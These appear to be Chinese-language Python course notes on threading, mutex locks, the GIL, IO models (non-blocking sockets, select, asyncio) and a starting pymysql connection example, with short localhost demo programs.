<h4 id="&#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E0B;&#x7684;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x6570;&#x636E;&#x662F;&#x5171;&#x4EAB;&#x7684;">&#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E0B;&#x7684;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x6570;&#x636E;&#x662F;&#x5171;&#x4EAB;&#x7684;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread
<span class="hljs-keyword">import</span> time


money = <span class="hljs-number">100</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">task</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> money
    money = <span class="hljs-number">666</span>
    print(money)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    t = Thread(target=task)
    t.start()
    t.join()
    print(money)
</code></pre>
<h4 id="&#x7EBF;&#x7A0B;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#x53CA;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;">&#x7EBF;&#x7A0B;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#x53CA;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, active_count, current_thread
<span class="hljs-keyword">import</span> os,time


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">task</span><span class="hljs-params">(n)</span>:</span>
    <span class="hljs-comment"># print(&apos;hello world&apos;,os.getpid())</span>
    print(<span class="hljs-string">&apos;hello world&apos;</span>,current_thread().name)
    time.sleep(n)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    t = Thread(target=task,args=(<span class="hljs-number">1</span>,))
    t1 = Thread(target=task,args=(<span class="hljs-number">2</span>,))
    t.start()
    t1.start()
    t.join()
    print(<span class="hljs-string">&apos;&#x4E3B;&apos;</span>,active_count())  <span class="hljs-comment"># &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x6B63;&#x5728;&#x6D3B;&#x8DC3;&#x7684;&#x7EBF;&#x7A0B;&#x6570;</span>
    <span class="hljs-comment"># print(&apos;&#x4E3B;&apos;,os.getpid())</span>
    <span class="hljs-comment"># print(&apos;&#x4E3B;&apos;,current_thread().name)  # &#x83B7;&#x53D6;&#x7EBF;&#x7A0B;&#x540D;&#x5B57;</span>
</code></pre>
<h4 id="&#x5B88;&#x62A4;&#x7EBF;&#x7A0B;">&#x5B88;&#x62A4;&#x7EBF;&#x7A0B;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># from threading import Thread</span>
<span class="hljs-comment"># import time</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># def task(name):</span>
<span class="hljs-comment">#     print(&apos;%s is running&apos;%name)</span>
<span class="hljs-comment">#     time.sleep(1)</span>
<span class="hljs-comment">#     print(&apos;%s is over&apos;%name)</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># if __name__ == &apos;__main__&apos;:</span>
<span class="hljs-comment">#     t = Thread(target=task,args=(&apos;egon&apos;,))</span>
<span class="hljs-comment">#     t.daemon = True</span>
<span class="hljs-comment">#     t.start()</span>
<span class="hljs-comment">#     print(&apos;&#x4E3B;&apos;)</span>

<span class="hljs-string">&quot;&quot;&quot;
&#x4E3B;&#x7EBF;&#x7A0B;&#x8FD0;&#x884C;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#x4E0D;&#x4F1A;&#x7ACB;&#x523B;&#x7ED3;&#x675F; &#x4F1A;&#x7B49;&#x5F85;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x975E;&#x5B88;&#x62A4;&#x7EBF;&#x7A0B;&#x7ED3;&#x675F;&#x624D;&#x4F1A;&#x7ED3;&#x675F;
    &#x56E0;&#x4E3A;&#x4E3B;&#x7EBF;&#x7A0B;&#x7684;&#x7ED3;&#x675F;&#x610F;&#x5473;&#x7740;&#x6240;&#x5728;&#x7684;&#x8FDB;&#x7A0B;&#x7684;&#x7ED3;&#x675F;
&quot;&quot;&quot;</span>


<span class="hljs-comment"># &#x7A0D;&#x5FAE;&#x6709;&#x4E00;&#x70B9;&#x8FF7;&#x60D1;&#x6027;&#x7684;&#x4F8B;&#x5B50;</span>
<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread
<span class="hljs-keyword">import</span> time


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span>:</span>
    print(<span class="hljs-number">123</span>)
    time.sleep(<span class="hljs-number">1</span>)
    print(<span class="hljs-string">&apos;end123&apos;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">()</span>:</span>
    print(<span class="hljs-number">456</span>)
    time.sleep(<span class="hljs-number">3</span>)
    print(<span class="hljs-string">&apos;end456&apos;</span>)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    t1 = Thread(target=foo)
    t2 = Thread(target=func)
    t1.daemon = <span class="hljs-keyword">True</span>
    t1.start()
    t2.start()
    print(<span class="hljs-string">&apos;&#x4E3B;.......&apos;</span>)
</code></pre>
<h4 id="&#x7EBF;&#x7A0B;&#x4E92;&#x65A5;&#x9501;">&#x7EBF;&#x7A0B;&#x4E92;&#x65A5;&#x9501;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread,Lock
<span class="hljs-keyword">import</span> time


money = <span class="hljs-number">100</span>
mutex = Lock()


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">task</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">global</span> money
    mutex.acquire()
    tmp = money
    time.sleep(<span class="hljs-number">0.1</span>)
    money = tmp - <span class="hljs-number">1</span>
    mutex.release()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:

    t_list = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
        t = Thread(target=task)
        t.start()
        t_list.append(t)
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> t_list:
        t.join()
    print(money)
</code></pre>
<h4 id="gil&#x5168;&#x5C40;&#x89E3;&#x91CA;&#x5668;&#x9501;">GIL&#x5168;&#x5C40;&#x89E3;&#x91CA;&#x5668;&#x9501;</h4>
<pre><code>python&#x89E3;&#x91CA;&#x5668;&#x5176;&#x5B9E;&#x6709;&#x591A;&#x4E2A;&#x7248;&#x672C;
    Cpython
    Jpython
    Pypypython
&#x4F46;&#x662F;&#x666E;&#x904D;&#x4F7F;&#x7528;&#x7684;&#x90FD;&#x662F;CPython&#x89E3;&#x91CA;&#x5668;

&#x5728;CPython&#x89E3;&#x91CA;&#x5668;&#x4E2D;GIL&#x662F;&#x4E00;&#x628A;&#x4E92;&#x65A5;&#x9501;&#xFF0C;&#x7528;&#x6765;&#x963B;&#x6B62;&#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E0B;&#x7684;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x540C;&#x65F6;&#x6267;&#x884C;
    &#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E0B;&#x7684;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x591A;&#x6838;&#x4F18;&#x52BF;&#xFF01;&#xFF01;&#xFF01;
    &#x7591;&#x95EE;:python&#x7684;&#x591A;&#x7EBF;&#x7A0B;&#x662F;&#x4E0D;&#x662F;&#x4E00;&#x70B9;&#x7528;&#x90FD;&#x6CA1;&#x6709;&#xFF1F;&#xFF1F;&#xFF1F;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x591A;&#x6838;&#x4F18;&#x52BF;

&#x56E0;&#x4E3A;cpython&#x4E2D;&#x7684;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x4E0D;&#x662F;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#x7684;
&#x5185;&#x5B58;&#x7BA1;&#x7406;(&#x5783;&#x573E;&#x56DE;&#x6536;&#x673A;&#x5236;)
    1.&#x5E94;&#x7528;&#x8BA1;&#x6570;
    2.&#x6807;&#x8BB0;&#x6E05;&#x695A;
    3.&#x5206;&#x4EE3;&#x56DE;&#x6536;

&#x91CD;&#x70B9;:
    1.GIL&#x4E0D;&#x662F;python&#x7684;&#x7279;&#x70B9;&#x800C;&#x662F;CPython&#x89E3;&#x91CA;&#x5668;&#x7684;&#x7279;&#x70B9;
    2.GIL&#x662F;&#x4FDD;&#x8BC1;&#x89E3;&#x91CA;&#x5668;&#x7EA7;&#x522B;&#x7684;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;
    3.GIL&#x4F1A;&#x5BFC;&#x81F4;&#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E0B;&#x7684;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x65E0;&#x6CD5;&#x540C;&#x65F6;&#x6267;&#x884C;&#x5373;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x591A;&#x6838;&#x4F18;&#x52BF;(******)
    4.&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x52A0;&#x4E0D;&#x540C;&#x7684;&#x9501;&#x5904;&#x7406; 
    5.&#x89E3;&#x91CA;&#x578B;&#x8BED;&#x8A00;&#x7684;&#x901A;&#x75C5;:&#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E0B;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x591A;&#x6838;&#x4F18;&#x52BF;
</code></pre><p><img src="https://s3.bmp.ovh/imgs/2022/09/22/f95923602ec3ee99.jpg" alt=""></p>
<p><img src="https://s3.bmp.ovh/imgs/2022/09/22/7d7377018ca0243c.png" alt=""></p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x591A;&#x7EBF;&#x7A0B;&#x662F;&#x5426;&#x6709;&#x7528;&#x8981;&#x770B;&#x5177;&#x4F53;&#x60C5;&#x51B5;
&#x5355;&#x6838;:&#x56DB;&#x4E2A;&#x4EFB;&#x52A1;(IO&#x5BC6;&#x96C6;&#x578B;\&#x8BA1;&#x7B97;&#x5BC6;&#x96C6;&#x578B;)
&#x591A;&#x6838;:&#x56DB;&#x4E2A;&#x4EFB;&#x52A1;(IO&#x5BC6;&#x96C6;&#x578B;\&#x8BA1;&#x7B97;&#x5BC6;&#x96C6;&#x578B;)
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x8BA1;&#x7B97;&#x5BC6;&#x96C6;&#x578B;   &#x6BCF;&#x4E2A;&#x4EFB;&#x52A1;&#x90FD;&#x9700;&#x8981;10s</span>
&#x5355;&#x6838;(&#x4E0D;&#x7528;&#x8003;&#x8651;&#x4E86;)
    &#x591A;&#x8FDB;&#x7A0B;:&#x989D;&#x5916;&#x7684;&#x6D88;&#x8017;&#x8D44;&#x6E90;
  &#x591A;&#x7EBF;&#x7A0B;:&#x4ECB;&#x7ECD;&#x5F00;&#x9500;
&#x591A;&#x6838;
    &#x591A;&#x8FDB;&#x7A0B;:&#x603B;&#x8017;&#x65F6; <span class="hljs-number">10</span>+
  &#x591A;&#x7EBF;&#x7A0B;:&#x603B;&#x8017;&#x65F6; <span class="hljs-number">40</span>+
<span class="hljs-comment"># IO&#x5BC6;&#x96C6;&#x578B;  </span>
&#x591A;&#x6838;
    &#x591A;&#x8FDB;&#x7A0B;:&#x76F8;&#x5BF9;&#x6D6A;&#x8D39;&#x8D44;&#x6E90;
  &#x591A;&#x7EBF;&#x7A0B;:&#x66F4;&#x52A0;&#x8282;&#x7701;&#x8D44;&#x6E90;
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment"># &#x8BA1;&#x7B97;&#x5BC6;&#x96C6;&#x578B;</span>
<span class="hljs-comment"># from multiprocessing import Process</span>
<span class="hljs-comment"># from threading import Thread</span>
<span class="hljs-comment"># import os,time</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># def work():</span>
<span class="hljs-comment">#     res = 0</span>
<span class="hljs-comment">#     for i in range(10000000):</span>
<span class="hljs-comment">#         res *= i</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># if __name__ == &apos;__main__&apos;:</span>
<span class="hljs-comment">#     l = []</span>
<span class="hljs-comment">#     print(os.cpu_count())  # &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BA1;&#x7B97;&#x673A;CPU&#x4E2A;&#x6570;</span>
<span class="hljs-comment">#     start_time = time.time()</span>
<span class="hljs-comment">#     for i in range(12):</span>
<span class="hljs-comment">#         p = Process(target=work)  # 1.4679949283599854</span>
<span class="hljs-comment">#         t = Thread(target=work)  # 5.698534250259399</span>
<span class="hljs-comment">#         t.start()</span>
<span class="hljs-comment">#         # p.start()</span>
<span class="hljs-comment">#         # l.append(p)</span>
<span class="hljs-comment">#         l.append(t)</span>
<span class="hljs-comment">#     for p in l:</span>
<span class="hljs-comment">#         p.join()</span>
<span class="hljs-comment">#     print(time.time()-start_time)</span>



<span class="hljs-comment"># IO&#x5BC6;&#x96C6;&#x578B;</span>
<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process
<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread
<span class="hljs-keyword">import</span> os,time


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span><span class="hljs-params">()</span>:</span>
    time.sleep(<span class="hljs-number">2</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    l = []
    print(os.cpu_count())  <span class="hljs-comment"># &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8BA1;&#x7B97;&#x673A;CPU&#x4E2A;&#x6570;</span>
    start_time = time.time()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4000</span>):
        <span class="hljs-comment"># p = Process(target=work)  # 21.149890184402466</span>
        t = Thread(target=work)  <span class="hljs-comment"># 3.007986068725586</span>
        t.start()
        <span class="hljs-comment"># p.start()</span>
        <span class="hljs-comment"># l.append(p)</span>
        l.append(t)
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> l:
        p.join()
    print(time.time()-start_time)
</code></pre>
<h4 id="&#x7F51;&#x7EDC;io&#x6A21;&#x578B;">&#x7F51;&#x7EDC;IO&#x6A21;&#x578B;</h4>
<h4 id="1&#xFF09;&#x963B;&#x585E;io">1&#xFF09;&#x963B;&#x585E;IO</h4>
<p><img src="https://cdnjson.com/images/2023/05/28/image.png" alt="image.png"></p>
<p>&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x7F16;&#x5199;&#x7684;&#x5C0F;&#x8FDC;&#x63A7;</p>
<h4 id="2&#xFF09;&#x975E;&#x963B;&#x585E;io">2&#xFF09;&#x975E;&#x963B;&#x585E;IO</h4>
<p>&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x6293;&#x4F4F;CPU</p>
<p><img src="https://cdnjson.com/images/2023/05/28/imagea3ca7262331f2262.png" alt="imagea3ca7262331f2262.png"></p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x8981;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x975E;&#x963B;&#x585E;IO&#x6A21;&#x578B;
&quot;&quot;&quot;</span>
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> time


server = socket.socket()
server.bind((<span class="hljs-string">&apos;127.0.0.1&apos;</span>, <span class="hljs-number">8081</span>))
server.listen(<span class="hljs-number">5</span>)
server.setblocking(<span class="hljs-keyword">False</span>)
<span class="hljs-comment"># &#x5C06;&#x6240;&#x6709;&#x7684;&#x7F51;&#x7EDC;&#x963B;&#x585E;&#x53D8;&#x4E3A;&#x975E;&#x963B;&#x585E;</span>
r_list = []
del_list = []
<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    <span class="hljs-keyword">try</span>:
        conn, addr = server.accept()
        r_list.append(conn)
    <span class="hljs-keyword">except</span> BlockingIOError:
        <span class="hljs-comment"># time.sleep(0.1)</span>
        <span class="hljs-comment"># print(&apos;&#x5217;&#x8868;&#x7684;&#x957F;&#x5EA6;:&apos;,len(r_list))</span>
        <span class="hljs-comment"># print(&apos;&#x505A;&#x5176;&#x4ED6;&#x4E8B;&apos;)</span>
        <span class="hljs-keyword">for</span> conn <span class="hljs-keyword">in</span> r_list:
            <span class="hljs-keyword">try</span>:
                data = conn.recv(<span class="hljs-number">1024</span>)  <span class="hljs-comment"># &#x6CA1;&#x6709;&#x6D88;&#x606F; &#x62A5;&#x9519;</span>
                <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">0</span>:  <span class="hljs-comment"># &#x5BA2;&#x6237;&#x7AEF;&#x65AD;&#x5F00;&#x94FE;&#x63A5;</span>
                    conn.close()  <span class="hljs-comment"># &#x5173;&#x95ED;conn</span>
                    <span class="hljs-comment"># &#x5C06;&#x65E0;&#x7528;&#x7684;conn&#x4ECE;r_list&#x5220;&#x9664;</span>
                    del_list.append(conn)
                    <span class="hljs-keyword">continue</span>
                conn.send(data.upper())
            <span class="hljs-keyword">except</span> BlockingIOError:
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">except</span> ConnectionResetError:
                conn.close()
                del_list.append(conn)
        <span class="hljs-comment"># &#x6325;&#x624B;&#x65E0;&#x7528;&#x7684;&#x94FE;&#x63A5;</span>
        <span class="hljs-keyword">for</span> conn <span class="hljs-keyword">in</span> del_list:
            r_list.remove(conn)
        del_list.clear()

<span class="hljs-comment"># &#x5BA2;&#x6237;&#x7AEF;</span>
<span class="hljs-keyword">import</span> socket


client = socket.socket()
client.connect((<span class="hljs-string">&apos;127.0.0.1&apos;</span>,<span class="hljs-number">8081</span>))


<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    client.send(<span class="hljs-string">b&apos;hello world&apos;</span>)
    data = client.recv(<span class="hljs-number">1024</span>)
    print(data)
</code></pre>
<h4 id="3&#xFF09;io&#x591A;&#x8DEF;&#x590D;&#x7528;">3&#xFF09;IO&#x591A;&#x8DEF;&#x590D;&#x7528;</h4>
<p>&#x4F18;&#x70B9;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x4E00;&#x6B21;&#x6027;&#x76D1;&#x7BA1;&#x5F88;&#x591A;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;IO&#x591A;&#x8DEF;&#x590D;&#x7528;&#x6BD4;&#x963B;&#x585E;IO&#x5728;&#x7F16;&#x5199;&#x8FDC;&#x63A7;&#x8F6F;&#x4EF6;&#x4E0A;&#x7684;&#x4F18;&#x52BF;</p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5F53;&#x76D1;&#x7BA1;&#x7684;&#x5BF9;&#x8C61;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x7684;&#x65F6;&#x5019; &#x5176;&#x5B9E;IO&#x591A;&#x8DEF;&#x590D;&#x7528;&#x8FDE;&#x963B;&#x585E;IO&#x90FD;&#x6BD4;&#x6BD4;&#x4E0D;&#x4E0A;&#xFF01;&#xFF01;&#xFF01;
&#x4F46;&#x662F;IO&#x591A;&#x8DEF;&#x590D;&#x7528;&#x53EF;&#x4EE5;&#x4E00;&#x6B21;&#x6027;&#x76D1;&#x7BA1;&#x5F88;&#x591A;&#x4E2A;&#x5BF9;&#x8C61;

server = socket.socket()
conn,addr = server.accept()

&#x76D1;&#x7BA1;&#x673A;&#x5236;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x672C;&#x8EAB;&#x5C31;&#x6709;&#x7684; &#x5982;&#x679C;&#x4F60;&#x60F3;&#x8981;&#x7528;&#x8BE5;&#x76D1;&#x7BA1;&#x673A;&#x5236;(select)
&#x9700;&#x8981;&#x4F60;&#x5BFC;&#x5165;&#x5BF9;&#x5E94;&#x7684;select&#x6A21;&#x5757;
&quot;&quot;&quot;</span>
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> select


server = socket.socket()
server.bind((<span class="hljs-string">&apos;127.0.0.1&apos;</span>,<span class="hljs-number">8080</span>))
server.listen(<span class="hljs-number">5</span>)
server.setblocking(<span class="hljs-keyword">False</span>)
read_list = [server]


<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    r_list, w_list, x_list = select.select(read_list, [], [])
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5E2E;&#x4F60;&#x76D1;&#x7BA1;
    &#x4E00;&#x65E6;&#x6709;&#x4EBA;&#x6765;&#x4E86; &#x7ACB;&#x523B;&#x7ED9;&#x4F60;&#x8FD4;&#x56DE;&#x5BF9;&#x5E94;&#x7684;&#x76D1;&#x7BA1;&#x5BF9;&#x8C61;
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># print(res)  # ([&lt;socket.socket fd=3, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=(&apos;127.0.0.1&apos;, 8080)&gt;], [], [])</span>
    <span class="hljs-comment"># print(server)</span>
    <span class="hljs-comment"># print(r_list)</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r_list:  <span class="hljs-comment">#</span>
        <span class="hljs-string">&quot;&quot;&quot;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x5BF9;&#x8C61;&#x505A;&#x4E0D;&#x540C;&#x7684;&#x5904;&#x7406;&quot;&quot;&quot;</span>
        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">is</span> server:
            conn, addr = i.accept()
            <span class="hljs-comment"># &#x4E5F;&#x5E94;&#x8BE5;&#x6DFB;&#x52A0;&#x5230;&#x76D1;&#x7BA1;&#x7684;&#x961F;&#x5217;&#x4E2D;</span>
            read_list.append(conn)
        <span class="hljs-keyword">else</span>:
            res = i.recv(<span class="hljs-number">1024</span>)
            <span class="hljs-keyword">if</span> len(res) == <span class="hljs-number">0</span>:
                i.close()
                <span class="hljs-comment"># &#x5C06;&#x65E0;&#x6548;&#x7684;&#x76D1;&#x7BA1;&#x5BF9;&#x8C61; &#x79FB;&#x9664;</span>
                read_list.remove(i)
                <span class="hljs-keyword">continue</span>
            print(res)
            i.send(<span class="hljs-string">b&apos;heiheiheiheihei&apos;</span>)

 <span class="hljs-comment"># &#x5BA2;&#x6237;&#x7AEF;</span>
<span class="hljs-keyword">import</span> socket


client = socket.socket()
client.connect((<span class="hljs-string">&apos;127.0.0.1&apos;</span>,<span class="hljs-number">8080</span>))


<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:

    client.send(<span class="hljs-string">b&apos;hello world&apos;</span>)
    data = client.recv(<span class="hljs-number">1024</span>)
    print(data)
</code></pre>
<p><img src="https://cdnjson.com/images/2023/05/28/image9c3697e4fc8ef90e.png" alt="image9c3697e4fc8ef90e.png"></p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x76D1;&#x7BA1;&#x673A;&#x5236;&#x5176;&#x5B9E;&#x6709;&#x5F88;&#x591A;
select&#x673A;&#x5236;  windows linux&#x90FD;&#x6709;

poll&#x673A;&#x5236;    &#x53EA;&#x5728;linux&#x6709;   poll&#x548C;select&#x90FD;&#x53EF;&#x4EE5;&#x76D1;&#x7BA1;&#x591A;&#x4E2A;&#x5BF9;&#x8C61; &#x4F46;&#x662F;poll&#x76D1;&#x7BA1;&#x7684;&#x6570;&#x91CF;&#x66F4;&#x591A;

&#x4E0A;&#x8FF0;select&#x548C;poll&#x673A;&#x5236;&#x5176;&#x5B9E;&#x90FD;&#x4E0D;&#x662F;&#x5F88;&#x5B8C;&#x7F8E; &#x5F53;&#x76D1;&#x7BA1;&#x7684;&#x5BF9;&#x8C61;&#x7279;&#x522B;&#x591A;&#x7684;&#x65F6;&#x5019;
&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0; &#x6781;&#x5176;&#x5927;&#x7684;&#x5EF6;&#x65F6;&#x54CD;&#x5E94;

epoll&#x673A;&#x5236;   &#x53EA;&#x5728;linux&#x6709;
    &#x5B83;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x76D1;&#x7BA1;&#x5BF9;&#x8C61;&#x90FD;&#x7ED1;&#x5B9A;&#x4E00;&#x4E2A;&#x56DE;&#x8C03;&#x673A;&#x5236;
    &#x4E00;&#x65E6;&#x6709;&#x54CD;&#x5E94; &#x56DE;&#x8C03;&#x673A;&#x5236;&#x7ACB;&#x523B;&#x53D1;&#x8D77;&#x63D0;&#x9192;

&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8FD8;&#x9700;&#x8981;&#x8003;&#x8651;&#x4E0D;&#x540C;&#x68C0;&#x6D4B;&#x673A;&#x5236; &#x4E66;&#x5199;&#x4EE3;&#x7801;&#x592A;&#x591A;&#x7E41;&#x7410;
&#x6709;&#x4E00;&#x4E2A;&#x4EBA;&#x80FD;&#x591F;&#x6839;&#x636E;&#x4F60;&#x8DD1;&#x7684;&#x5E73;&#x53F0;&#x7684;&#x4E0D;&#x540C;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x9009;&#x62E9;&#x5BF9;&#x5E94;&#x7684;&#x76D1;&#x7BA1;&#x673A;&#x5236;
selectors&#x6A21;&#x5757;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="4&#xFF09;&#x5F02;&#x6B65;io">4&#xFF09;&#x5F02;&#x6B65;IO</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5F02;&#x6B65;IO&#x6A21;&#x578B;&#x662F;&#x6240;&#x6709;&#x6A21;&#x578B;&#x4E2D;&#x6548;&#x7387;&#x6700;&#x9AD8;&#x7684; &#x4E5F;&#x662F;&#x4F7F;&#x7528;&#x6700;&#x5E7F;&#x6CDB;&#x7684;
&#x76F8;&#x5173;&#x7684;&#x6A21;&#x5757;&#x548C;&#x6846;&#x67B6;
    &#x6A21;&#x5757;:asyncio&#x6A21;&#x5757;
    &#x5F02;&#x6B65;&#x6846;&#x67B6;:sanic tronado twisted
        &#x901F;&#x5EA6;&#x5FEB;&#xFF01;&#xFF01;&#xFF01;
&quot;&quot;&quot;</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> asyncio


<span class="hljs-meta">@asyncio.coroutine</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span>:</span>
    print(<span class="hljs-string">&apos;hello world %s&apos;</span>%threading.current_thread())
    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> asyncio.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># &#x6362;&#x6210;&#x771F;&#x6B63;&#x7684;IO&#x64CD;&#x4F5C;</span>
    print(<span class="hljs-string">&apos;hello world %s&apos;</span> % threading.current_thread())


loop = asyncio.get_event_loop()
tasks = [hello(),hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()
</code></pre>
<p>&#x5BF9;&#x6BD4;</p>
<p><img src="https://cdnjson.com/images/2023/05/28/imaged20730ecaa5935e9.png" alt="imaged20730ecaa5935e9.png"></p>
<h4 id="&#x603B;&#x7ED3;">&#x603B;&#x7ED3;</h4>
<pre><code class="lang-python">&#x591A;&#x8FDB;&#x7A0B;&#x548C;&#x591A;&#x7EBF;&#x7A0B;&#x90FD;&#x6709;&#x5404;&#x81EA;&#x7684;&#x4F18;&#x52BF;
&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x540E;&#x9762;&#x5728;&#x5199;&#x9879;&#x76EE;&#x7684;&#x65F6;&#x5019;&#x901A;&#x5E38;&#x53EF;&#x4EE5;
    &#x591A;&#x8FDB;&#x7A0B;&#x4E0B;&#x9762;&#x518D;&#x5F00;&#x8BBE;&#x591A;&#x7EBF;&#x7A0B;
&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x65E2;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x591A;&#x6838;&#x4E5F;&#x53EF;&#x4EE5;&#x4ECB;&#x7ECD;&#x8D44;&#x6E90;&#x6D88;&#x8017;
</code></pre>
<h4 id="pymysql">pymysql</h4>
<pre><code>pip3 install pymysql -i https://pypi.douban.com/simple/
</code></pre><pre><code class="lang-python"><span class="hljs-keyword">import</span> pymysql


conn = pymysql.connect(
    host = <span class="hljs-string">&apos;127.0.0.1&apos;</span>,
    port = <span class="hljs-number">3306</span>,
    user = <span class="hljs-string">&apos;root&apos;</span>,
    password = <span class="hljs-string">&apos;root&apos;</span>,
    database = <span class="hljs-string">&apos;student1&apos;</span>,
    charset = <span class="hljs-string">&apos;utf8&apos;</span>  <span class="hljs-comment"># &#x7F16;&#x7801;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x52A0;-</span>
)  <span class="hljs-comment"># &#x94FE;&#x63A5;&#x6570;&#x636E;&#x5E93;</span>
